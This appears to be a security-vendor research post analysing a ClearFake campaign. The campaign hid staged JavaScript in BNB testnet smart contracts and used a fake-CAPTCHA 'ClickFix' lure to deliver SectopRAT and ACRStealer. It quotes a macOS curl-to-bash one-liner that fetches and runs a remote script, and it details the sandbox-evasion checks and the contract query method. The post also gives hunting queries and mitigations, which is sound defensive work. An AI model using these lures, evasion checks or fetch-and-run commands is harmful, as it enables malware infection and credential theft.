# Smart Contracts for C&C: How ClearFake Hid in Plain Sight on BSC Testnet

- **Source :** trendmicro
- **URL :** https://www.trendmicro.com/en/research/26/e/smart-contracts-for-command-and-control.html
- **Date :** 2026-05-26

---

Cyber Crime

# Smart Contracts for C&C: How ClearFake Hid in Plain Sight on BSC Testnet 

TrendAI™ Research analyzed an intrusion where threat actors used the EtherHiding technique to route ClearFake payload delivery through smart contracts on the BNB Smart Chain testnet. The attack chain ended with two simultaneously deployed stealers, SectopRAT and ACRStealer alongside an on-chain execution tracker that confirmed each victim compromise in real time.

By: Ryan Soliven 2026/05/26 Read time:  ( words) 

[ ![Share](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.addtoany.com/share) ![Print](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

**Key takeaways:**

  * Threat actors used EtherHiding to store ClearFake payload, routing instructions inside BNB Smart Chain testnet smart contractsmaking an immutable, free to operate infrastructure that cannot be taken down due to the nature of a blockchain network. 
  * The attack chain delivered two simultaneous payloads, SectopRAT (a .NET-based RAT capable of browser session hijacking), and ACRStealer (a C++ infostealer) via a ClickFix social engineering overlay, with separate payloads for Windows and macOS victims routed by OS detection. An on-chain execution tracker embedded in the smart contract confirmed each victim compromise in real time.
  * Four smart contracts shared a single deployer wallet, with the oldest deployed nearly a year before analysis, confirming that this blockchain C&C has been a long-running, actively maintained campaign, not a one-off experiment. 



TrendAI™ Research analyzed in May 2026 an intrusion where threat actors used a technique known as [EtherHiding](https://www.bleepingcomputer.com/news/security/north-korean-hackers-use-etherhiding-to-hide-malware-on-the-blockchain/) to store payload routing instructions inside BNB Smart Chain (formerly Binance Smart Chain or BSC) smart contracts. Unlike traditional command-and-control (C&C) infrastructure, this routing layer cannot be altered, suspended, or seized by security vendors, registrars, or law enforcement due to the immutable nature of the blockchain. TrendAI™ found that the injected JavaScript on compromised websites queried these contracts to retrieve and route victims to the next stage of the attack chain.

Blockchain as command-and-control infrastructure

Smart contracts are self-executing programs on blockchain networks that enable trustless transactions without central intermediaries, forming the backbone of decentralized finance. BNB Smart Chain is an Ethereum-compatible network where contracts with arbitrary data are written in [Solidity](https://soliditylang.org/) and compiled to bytecode that runs identically across every node. 

The EtherHiding technique was first documented by [Guardz](https://labs.guard.io/etherhiding-hiding-web2-malicious-code-in-web3-smart-contracts-65ea78efad16) in October 2023 where threat actors injected a JavaScript loader into compromised websites that retrieves malicious next-stage payload data directly from a BSC contract via a standard _eth_call_ request. This bypasses URL-based blocking entirely since no payload URL exists in any static file. 

The ClearFake campaign refined this technique by storing the entire payload JavaScript on-chain rather than just a URL, so malicious code is returned in full and executed in the victim's browser with no external hosting required. [Google's](https://cloud.google.com/blog/topics/threat-intelligence/dprk-adopts-etherhiding) October 2025 research confirmed that North Korean state-sponsored actors ([UNC5342](https://thehackernews.com/2025/10/north-korean-hackers-use-etherhiding-to.html)) have since adopted the same technique, indicating that blockchain C&C has now been adopted by nation-state capability.

Blockchain C&C is operationally attractive for cybercriminals because it is immutable, decentralized, and cost nothing: 

  * Payload data written to a blockchain cannot be sinkholed, deleted or seized. 
  * It is replicated across thousands of nodes with no central server to take down.
  * By operating on the BNB testnet, threat actors pay nothing because test BNB has no monetary value and is freely available from public faucets.



The contract architecture

This analysis began as a TrendAI Vision One™ Managed Detection Response (MDR) case, where a customer organization had one employee browsing a legitimate recreational website and then ended up with a multi-stage compromise that included a silently installed full Python-based Remote Access Trojan, an attempted shellcode injection, and browser credentials targeted. 

It should be noted that all filtering, dispatching, and overlay rendering happened client-side in the victim's browser after retrieval from the contracts, not within the contract logic itself.

During analysis, TrendAI™ Research identified four distinct smart contract addresses across the attack chain, each discovered one stage deeper than the last: 

  * _[0xA1decFB75C8C0CA28C10517ce56B710baf727d2e](https://testnet.bscscan.com/address/0xA1decFB75C8C0CA28C10517ce56B710baf727d2e) _was found in the Stage 1 JavaScript injected into the compromised website. It holds base64-encoded JavaScript for an anti-analysis dispatcher. This blog refers to it as [Smart Contract A](https://testnet.bscscan.com/address/0xA1decFB75C8C0CA28C10517ce56B710baf727d2e). 
  * [_0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff_](https://testnet.bscscan.com/address/0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff) was found in the Stage 2 JavaScript decoded from that contract's storage. It is a Windows-specific ClickFix overlay. This blog refers to it as [Smart Contract B](https://testnet.bscscan.com/address/0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff). 
  * _[0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5](https://testnet.bscscan.com/address/0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5) _was found in the Stage 2 JavaScript decoded from that contract's storage. It is a macOS-specific payload. We will refer to this as [Smart Contract C](https://testnet.bscscan.com/address/0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5). 
  * _[0xf4a32588b50a59a82fbA148d436081A48d80832A](https://testnet.bscscan.com/address/0xf4a32588b50a59a82fbA148d436081A48d80832A) _was found in the Stage 3 JavaScript decoded from the Windows payload contract. It stores conversion states, polled by the overlay JavaScript to detect when the victim had executed the payload. This blog will refer to it as [Smart Contract D](https://testnet.bscscan.com/address/0xf4a32588b50a59a82fbA148d436081A48d80832A). 



The Solidity contract deployed for this campaign implements three functions. 

  * The  _set()_ function (_selector 0x4ed3885e_) is restricted to the contract owner via an address equality check and accepts a string payload. It writes that string directly into the contract's own on-chain storage. 
  * The  _get()_ function (_selector 0x6d4ce63c_) is publicly callable with no access control and returns the stored string directly from contract storage. This is what the victim's browser calls via _eth_call_. 
  * The  _owner()_ function returns the deployer's wallet address. The contracts contain no complex logic; each is a minimal key-value store. A payload update requires a single on-chain transaction calling _set()_ and then propagation to every site querying the contract is immediate. 



[Smart Contract A](https://testnet.bscscan.com/address/0xA1decFB75C8C0CA28C10517ce56B710baf727d2e) is the entry-point contract used in this campaign and operates exactly on this model. The threat actor called  _set()_ once to write the base64-encoded Stage 2 JavaScript payload into the contract's on-chain storage. From that point, any caller anywhere in the world including the victim's browser could call  _get()_ to retrieve the full payload string. Crucially, no server hosts the data; it lives inside the contract storage on every BSC node simultaneously and cannot be removed due to the nature of a blockchain.

On-chain verification of all four contracts confirms they share a single deployer wallet: [ _0xd71f4cdC84420d2bd07F50787B4F998b4c2d5290_](https://testnet.bscscan.com/address/0xd71f4cdc84420d2bd07f50787b4f998b4c2d5290). The deployment timeline establishes the campaign's operational history: 

  * The Stage 1 entry-point contract [Smart Contract A](https://testnet.bscscan.com/address/0xA1decFB75C8C0CA28C10517ce56B710baf727d2e) was deployed on May 26, 2025
  * The Windows and macOS payload contracts [Smart Contract B](https://testnet.bscscan.com/address/0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff) and [Smart Contract C](https://testnet.bscscan.com/address/0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5) were deployed on September 24, 2025 and September 30, 2025 respectively
  * The execution confirmation tracker [Smart Contract D](https://testnet.bscscan.com/address/0xf4a32588b50a59a82fbA148d436081A48d80832A) was on June 18, 2025



BSCScan transaction data confirms the campaign was actively updating payload contracts and recording new victim executions at the time of this analysis. 

Attack analysis

![Figure 1. Attack Diagram ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig1fin.jpg)

Figure 1. Attack Diagram 

**Initial access: The compromised watering hole**

The victim browsed a legitimate Swiss recreational activity site running on WordPress where 22 scripts loaded by the page were legitimate WordPress and plugin resources, but one was not. 

A _ <script src="data:text/javascript;base64[REDACTED]">_ tag had been injected at line 146 of the page's _ <head> _section. The payload was delivered as inline data, a URI with no external domain reference and no URL to block. 

The base64-decoded content revealed the ClearFake Stage 1 loader. 

![Figure 2: View-source of the Swiss website showing the injected ClearFake Stage 1 loader](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig2.png)

Figure 2: View-source of the Swiss website showing the injected ClearFake Stage 1 loader

**Stage 1: The injected JavaScript and blockchain query**

Decoding the injected  _< script src="data:text/javascript;base64[REDACTED]">_ tag revealed an obfuscated JavaScript file. The obfuscation uses a standard anti-static-analysis technique with two components:

  * A string-array rotation pattern, where a function (_0x4e2e()) returns all plaintext strings as an indexed array.
  * A runtime rotation where a self-invoking function shuffles that array at runtime until an integer checksum validates.



Deobfuscation by resolving the string-array indices reveals the following plaintext strings embedded in the script: 

  * hxxps://bsc-testnet-rpc.publicnode[.]com/: A BSC RPC endpoint 
  * eth_call: A JSON-RPC method 
  * [Smart Contract A](https://testnet.bscscan.com/address/0xA1decFB75C8C0CA28C10517ce56B710baf727d2e): The Stage 1 contract address 
  * 0x6d4ce63c: The function selector for  _get()_
  * application/json: A request Content-Type 
  * result, json, slice, fromCharCode, apply: The response decoding chain 



The core logic, once deobfuscated, is the async load_() function shown below: 

![Figure 3. The deobfuscated Stage 1 load_\(\) function, the async blockchain query that constructs an eth_call JSON-RPC request to Smart Contract A on the BSC testnet](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig3.png)

Figure 3. The deobfuscated Stage 1 load_() function, the async blockchain query that constructs an eth_call JSON-RPC request to Smart Contract A on the BSC testnet

At this stage, three points are forensically significant. 

  1. The ABI (Application Binary Interface) decoding is done entirely in custom JavaScript. The script manually parses the EVM ABI-encoded string response (32-byte offset, 32-byte length, then raw string bytes) rather than using a Web3 library, minimizing dependencies and keeping the script self-contained. In the context of Ethereum and EVM-compatible blockchains, ABI defines the standard that function calls and data are encoded when communicating with a smart contract. 
  2. The contract is called on the BNC Smart Chain testnet (not mainnet), an operational choice that makes the infrastructure cheaper to deploy and harder to attribute. 
  3. The error handler is a silent empty  _function .catch(() = > {})_, no user-visible error if the call fails, ensuring the compromise is invisible to the victim. 



**Stage 2: Sandbox detection and payload routing**

During analysis, TrendAI™ Research found that the attack implemented two environment checks before routing to the OS-specific payload. The function is _Headless()_ tested seven conditions: 

  * navigator.webdriver === true: Checks if the webdriver flag is set (Selenium and similar) 
  * /HeadlessChrome/.test(navigator.userAgent): Checks if the "HeadlessChrome" string is present in the user agent 
  * navigator.userAgent.includes("PhantomJS"): Checks the PhantomJS headless browser 
  * navigator.userAgent.includes("Puppeteer"): Checks the Puppeteer automation framework 
  * navigator.userAgent.includes("Playwright"): Checks the Playwright automation framework 
  * window.outerWidth === 0 && window.outerHeight === 0: Checks if the outer window dimensions are zero
  * !window.chrome && !window.safari && !navigator.userAgent.includes("Firefox"): Checks if none of Chrome, Safari, or Firefox are detected in the browser environment 



On the other hand, the function is _Localhost()_ blocked all private IP ranges (_192.168.x.x, 10.x.x.x, 172.16–31.x.x_) and _localhost_ variants, preventing researcher sandboxes from triggering the payload. This check does not see the endpoint's internal network IP but the public egress IP returned by Avast IP geolocation service. Only real corporate or consumer endpoints with standard browsers reached Stage 3. 

Victims that passed both checks were fingerprinted by OS via _userAgent_ and _userAgentData_._platform_ , then routed to the appropriate BNB contract: 

  * Windows: [Smart Contract B](https://testnet.bscscan.com/address/0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff)
  * macOS: [Smart Contract C](https://testnet.bscscan.com/address/0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5)



If either environment check fails, it logs “ _stop watching us :)_ ” to the console and stops, and the victim sees nothing. 

![Figure 4. Raw Stage 2 JavaScript as stored in Smart Contract A, a compact unformatted JavaScript payload containing the isHeadless\(\) anti-analysis checks, isLocalhost\(\) private IP filter, OS detection logic, and routing calls to Smart Contract B \(Windows\) and Smart Contract C \(macOS\).](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig4.png)

Figure 4. Raw Stage 2 JavaScript as stored in Smart Contract A, a compact unformatted JavaScript payload containing the isHeadless() anti-analysis checks, isLocalhost() private IP filter, OS detection logic, and routing calls to Smart Contract B (Windows) and Smart Contract C (macOS).

**Stage 3: The ClickFix Overlay and user execution**

**_Windows_**

For victims running on Windows, the Stage 3 contract [Smart Contract B](https://testnet.bscscan.com/address/0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff) returned a ~43KB JavaScript payload containing the full ClickFix overlay, clipboard hijack logic, and conversion tracking infrastructure. 

Before rendering the overlay, the script called  _getUserID()_ , a synchronous _XMLHttpRequest_ to  _ip-info.ff.avast[.]com/v2/info_ (Avast's IP geolocation API) to retrieve the victim's real public IP. This was stored as a unique UUID in a cookie named  _cjs_id_ with a 2-day Time to Live (TTL), enabling the threat actor to track re-visits and correlate this endpoint with the blockchain conversion data. 

The overlay rendered two panels. The first showed a convincing Google reCAPTCHA lookalike that contained an authentic Google logo SVG, the “I'm not a robot” checkbox, and Privacy/Terms links. Clicking the checkbox triggered the second panel with the ClickFix social engineering instructions shown in Figure 5. 

![Figure 5. The ClickFix social engineering overlay rendered in the victim’s browser ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig5.png)

Figure 5. The ClickFix social engineering overlay rendered in the victim’s browser 

Simultaneously with the checkbox click, the script called  _navigator.clipboard.writeText()_ to inject the command into the victim's clipboard. Endpoint telemetry in this analysis confirms the victim opened the Run dialog and executed the clipboard command. Organizations are strongly advised to restrict user access to the Run dialog and implement controls that prevent the execution of clipboard-sourced commands. 

[ ![Figure 6. TrendAI Vision One™ execution profile showing the payload delivery path](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig6.png) ](/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig6.png)

Figure 6. TrendAI Vision One™ execution profile showing the payload delivery path

[ download ](/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig6.png)

Windows WebClient service loaded _put34b.camp_ , a remote DLL with a non-standard ._camp_ extension, directly into memory. No file creation event for _put34b.camp_ was recorded in endpoint telemetry, confirming it was never written to disk. 

Two  _PROCESS_CREATE_REMOTETHREAD_ events were recorded in telemetry: the  _rundll32.exe_ process (hosting the _put34b.camp_ payload) injected a remote thread into chrome.exe and _msedge.exe_ respectively. The purpose of these injections is browser credential theft _via _remote_debugging.pyd_ (this is discussed later in Stage 4). 

![Figure 7. TrendAI Vision One™ execution profile showing rundll32.exe spawning dllhost.exe and injecting remote threads into chrome.exe and msedge.exe for browser credential theft ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig7.png)

Figure 7. TrendAI Vision One™ execution profile showing rundll32.exe spawning dllhost.exe and injecting remote threads into chrome.exe and msedge.exe for browser credential theft 

**_macOS_**

For macOS victims, Stage 2 routed to [Smart Contract C](https://testnet.bscscan.com/address/0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5). The analysis of a macOS recent on-chain transaction data (_tx 0x029adddb5a03f16ffbe2907d17b36cb4032850f7856d9d38d3d9aba7ec3e2857_) confirms this is a deployed smart contract of the same key-value store type as the other payload contracts. 

The decoded payload follows the same structural pattern as the Windows path where is _Headless()_ does an anti-analysis check, Avast geo-IP lookup captures the victim's public IP and then stored in _cjs_id_ UUID cookie, and conversion tracker polls against [Smart Contract D](https://testnet.bscscan.com/address/0xf4a32588b50a59a82fbA148d436081A48d80832A). 

The social engineering overlay, however, is adapted for macOS. The overlay renders the same fake Google reCAPTCHA panel and “I'm not a robot” checkbox as the Windows version, confirming both payloads were authored by the same threat actor. However, the ClickFix instructions differ to match the macOS environment: 

  * Open Terminal application on your Mac (Applications > Utilities > Terminal) 
  * In the verification window, press Command + V 
  * Press Enter on your keyboard to finish 



The clipboard payload injected via  _navigator.clipboard.writeText()_ is a bash one-liner: 

  * _/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '[URL]')"_



This downloads and executes a remote shell script via curl, spoofing a macOS 10.15.7 (Catalina) user agent to ensure the correct payload variant is served. The download URL is dynamically constructed inside the obfuscated Stage 3 JavaScript and was not recoverable as plaintext from static analysis. 

The macOS payload contains one capability absent from the Windows version: on successful overlay display, it injects a Yandex Metrika analytics tracker (counter ID 99162160, that loads  _mc.yandex[.]ru/metrika/tag.js_) via a nested  _eval(atob( <base64 encoded command>)) _call. This provides the threat actor with a second victim-tracking channel for click maps, link tracking, and bounce rate data, entirely through a legitimate analytics service, independent of the blockchain conversion tracker. 

**Stage 4: RAT deployment**

A complete Python 3.15 embeddable runtime was then deployed to _C:\Users\\[User]\AppData\Local\FileZilla\Data\DC80D99D\_ , a directory chosen to blend with the legitimate FileZilla FTP client. Analysis found that 38 files were dropped, including  _pythonw.exe_ (a silent Python interpreter) and  _helper.py_ (a shellcode loader).

A process creation event confirmed that the command  _pythonw.exe_ and _helper.py_ was launched. 

![Figure 8. TrendAI Vision One execution profile showing dllhost.exe dropping pythonw.exe \(a silent Python interpreter\) and helper.py \(shellcode loader\)to the FileZilla Data directory ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig8.png)

Figure 8. TrendAI Vision One execution profile showing dllhost.exe dropping pythonw.exe (a silent Python interpreter) and helper.py (shellcode loader)to the FileZilla Data directory 

DNS queries to  _api.github[.]com, registry.npmjs[.]org_ ,  _pypi[.]org_ , and _download2324.mediafire[.]com_ were recorded from the _dllhost.exe_ process though the specific content downloaded was not captured.

The Python-based payload matches the ACRStealer profile as independently identified by [Vega Security](https://blog.vega.io/posts/clickfix_sectoprat_campaign/) in their analysis of a similar ClearFake contract cluster published February 2026. 

In SectopRAT, the stealer targeted browser passwords, credit cards, cookies, cryptocurrency wallet extensions, Discord/Telegram sessions, Steam, VPN and FTP credentials, and system info. It spawned an invisible secondary desktop to silently hijack browser sessions in Chrome or Edge that ran in the background, fully controlled by the attacker, while the victim saw nothing. Stolen data was sent to attacker-controlled C&C servers, with a MediaFire fallback if primary infrastructure goes down.

A DLL sideloading triad was dropped into _C:\Users\\[User]\AppData\Local\ Mozilla\Firefox\361e6e66.default\_. It consisted of a legitimate _vlc.exe_ and _libvlc.dll_ staged alongside a malicious _libvlccore.dll_. This was confirmed to be a proxy DLL forwarding VLC API calls to the real library, while also decrypting and executing a 4.29 MB encrypted payload embedded in its ._reloc_ section identified as _ACRStealer.Smart_ _Contract D: On-Chain execution confirmation_ .

Analysis also found [Smart Contract D](https://testnet.bscscan.com/address/0xf4a32588b50a59a82fbA148d436081A48d80832A) hardcoded in the Stage 3 JavaScript, the ClickFix overlay payload retrieved from [Smart Contract B](https://testnet.bscscan.com/address/0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff). This contract serves a dual purpose: it presents reinfection and confirms execution. 

On the read side, before displaying the overlay, the Stage 3 JavaScript calls  _isGoalReached(uuid)_ to see if the victim's UUID already exists in the contract's list. If it does, the overlay is suppressed entirely, preventing repeat lure exposure to already-compromised victims. 

On the write side, the threat actor calls  _addtoList(string)_ to record each confirmed execution by the victim’s public IP, captured via the Avast geo-IP lookup. Once the threat actor writes the entry, the next  _isGoalReached()_ poll from the victim's browser returns "yes" and causes the overlay to remove itself from the DOM. 

![Figure 9. ABI-decoded addtoList\(\) transaction on Smart Contract D, the on-chain execution confirmation written by the threat actor, with decoded victim public IP confirming successful payload execution.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/smart-contracts-for-c2/blockchainc2-fig9.png)

Figure 9. ABI-decoded addtoList() transaction on Smart Contract D, the on-chain execution confirmation written by the threat actor, with decoded victim public IP confirming successful payload execution.

Conclusion 

This case is a concrete demonstration that blockchain-based payload delivery has graduated from a proof-of-concept curiosity to an operational threat. 

The EtherHiding technique exploited in this campaign eliminates the most disruption-accessible components of traditional malware infrastructure: domains, IP addresses, and hosting providers. All four smart contracts identified in this investigation remain live on the BNB Smart Chain testnet as of writing. No action taken by any security vendor, domain registrar, or law enforcement agency can alter or remove the payloads stored within them; This is not a limitation but a fundamental property of immutable, decentralized infrastructure, and it demands that enterprise defenders rethink assumptions about what takedown-resistant C&C looks like. 

We recommend enterprises implement controls across several layers:

  * At the network layer, blocking outbound JSON-RPC traffic to known BNB Smart Chain testnet RPC endpoint starting with _bsc-testnet-rpc.publicnode[.]com_ removes the contract query step before any payload executes. 
  * At the endpoint layer, disabling the Windows WebClient service on workstations that do not require WebDAV eliminates the delivery mechanism for the remote DLL loader entirely. Where WebClient cannot be disabled, behavioral detection rules targeting _rundll32.exe_ with UNC path arguments are highly effective. 
  * At the browser layer, enterprise browser management policies that restrict clipboard write access can interrupt the ClickFix social engineering step before the victim executes the injected command. Organizations should also consider blocking or alerting on _eth_call_ and JSON-RPC patterns in web proxy logs as an early-warning indicator for EtherHiding activity across their fleet. 
  * At the end-user layer, awareness training on fake CAPTCHA and ClickFix lures is the first line of defense against the social engineering component, as the entire post-infection chain in this case required a single deliberate action by the victim. 



TrendAI Vision One™ provides the cross-layer detection and investigation capability that enabled this case to be fully reconstructed. The platform’s endpoint sensor captured the complete execution chain from the initial  _rundll32_ launch through remote thread injection,  _dllhost_ spawning, and Python RAT file drops correlating each event across process, file, and network telemetry in a single unified view. 

TrendAI™ Managed Detection and Response (MDR) provides 24/7 expert-led threat monitoring and response backed by TrendAI™ global threat intelligence. In this analysis, TrendAI™ MDR analysts pivoted from a single high-confidence endpoint alert to a full reconstruction of the blockchain delivery infrastructure to the SectopRAT payload. 

TrendAI Vision One™ Threat Intelligence Hub

[TrendAI Vision One™ Threat Intelligence Hub](https://www.trendmicro.com/en_us/business/products/threat-intelligence.html) provides the latest insights on emerging threats and threat actors, exclusive strategic reports from TrendAI™ Research, and TrendAI Vision One™ Threat Intelligence Feed in the TrendAI Vision One™ platform.

Emerging Threats: [Smart Contracts for C&C: How ClearFake Hid in Plain Sight on BSC Testnet](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence_insights?name=Smart%20Contracts%20for%20C%26C%3A%20How%20ClearFake%20Hid%20in%20Plain%20Sight%20on%20BSC%20Testnet)

**TrendAI Vision One™ Intelligence Reports (IOC Sweeping)**

<https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence?intrusionSet=Smart%20Contracts%20for%20C%26C%3A%20How%20ClearFake%20Hid%20in%20Plain%20Sight%20on%20BSC%20Testnet>

Hunting Queries 

eventSubId: 301 AND hostName:bsc-testnet-rpc.publicnode.com AND processName:(chrome.exe OR msedge.exe OR microsoftedge.exe OR firefox.exe OR iexplore.exe OR opera.exe OR brave.exe OR vivaldi.exe OR waterfox.exe)

Detects DNS query from common browser processes to Binance Smart Chain testnet RPC endpoint, an indication that the user browsed a compromised website with ClearFake embedded JS. Acceptable false positives for users developing web3 apps.

eventSubId: 701 AND parentName:rundll32.exe AND parentCmd:\\\\*** AND objectCmd:(chrome.exe OR msedge.exe OR microsoftedge.exe OR firefox.exe OR iexplore.exe OR opera.exe OR brave.exe OR vivaldi.exe OR waterfox.exe)

Detects browser process injection initiated originating from the execution of malicious DLL hosted on remote WebDAV UNC path to common browser processes.

TrendAI Vision One™ XDR Data Explorer App 

TrendAI Vision One™ customers can use the XDR Data Explorer App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

More hunting queries are available for TrendAI Vision One™ with Threat Intelligence Hub entitlement enabled. 

Indicators of Compromise

Indicators of compromise can be found [here](https://documents.trendmicro.com/assets/txt/Smart-Contracts-for-C2-IoC-list-kJLTXB3.txt).

Tags

[Latest News](/en/research.html?category=trend-micro-research:article-type/latest-news) | [Cyber Crime](/en/research.html?category=trend-micro-research:threats/cyber-crime) | [Research](/en/research.html?category=trend-micro-research:article-type/research) | [Articles, News, Reports](/en/research.html?category=trend-micro-research:medium/article) | [Cyber Threats](/en/research.html?category=trend-micro-research:threats/cyber-threats)

###  Authors 

  * Ryan Soliven

Sr. Incident Response Analyst




[ Contact Us ](mailto:tm_research@trendmicro.com)

### Related Articles

  * [ Unveiling Earth Kapre aka RedCurl’s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence ](/en/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html)
  * [ A Secure Access Service Edge (SASE) Guide for Leaders ](/en/research/22/h/secure-access-service-edge-sase-security-company.html)
  * [ Why the Open Secure AI Alliance Matters: Open Frontier Models, Open Deployment Flexibility ](/en/research/26/g/open-secure-ai-alliance.html)



[ See all articles ](/en/research.html)

[ ](/en/research.html)